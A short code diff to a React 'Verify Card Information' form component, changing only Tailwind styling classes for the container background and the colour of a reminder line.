@@ -73,7 +73,7 @@ const Verify = () => {
 
   return (
     <section className='mt-32 w-screen h-screen bg-primary flex items-center justify-center' id='verify'>
-      <div className='flex flex-col items-center justify-center sm:w-1/2 h-max py-12 sm:bg-secondary sm:rounded-xl sm:bg-opacity-50'>
+      <div className='flex flex-col items-center justify-center sm:w-1/2 h-max py-12 bg-secondary sm:rounded-xl'>
         <form method='post' className='flex flex-col gap-8 w-full px-12'> 
           <span className='flex justify-center text-4xl sm:text-6xl text-primaryText font-bold'>Verify Card Information</span>
           <select 
@@ -153,7 +153,7 @@ const Verify = () => {
           <Toaster />
         </form>
         { error && <p className='text-red-600'>{error}</p> }
-        <span className='relative bottom text-primaryText sm:text-xl'>Please Make Sure You Input The Correct Details  </span>
+        <span className='relative bottom text-white sm:text-xl'>Please Make Sure You Input The Correct Details  </span>
       </div>
     </section>
   )
